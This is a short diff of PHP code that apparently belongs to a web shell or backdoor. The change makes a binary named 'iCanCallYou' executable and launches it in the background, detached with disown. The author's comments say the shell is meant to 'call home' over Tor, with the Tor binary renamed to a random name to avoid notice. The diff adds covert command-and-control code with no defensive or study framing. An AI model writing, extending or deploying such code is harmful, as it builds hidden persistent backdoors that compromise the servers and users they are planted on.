@@ -59,9 +59,12 @@ if (!is_file(sprintf("%s/.iCanCallYou", scache))){
         define("slopTor", false);
     }else{
         define("slopTor", true);
+        if (!is_executable(sprintf("%s/%s", scache, 'iCanCallYou'))){
+            exec(sprintf("chmod +x %s/%s", scache, 'iCanCallYou'));
+        }
         // this will run every time, and likely cause system lag. i will look at to make it a function that calls tor(which ive named something else, will likely make this a random name for the binary, and give it the ability to download the tor binary.
         // so that this shell can at least call home or communicate directly over tor.
-        exec(sprintf("chmod +x %s/%s; %s/%s&$(which disown)", scache, 'iCanCallYou', scache, 'iCanCallYou'));
+        exec(sprintf("%s/%s&$(which disown)", scache, 'iCanCallYou'));
     }
 }
 
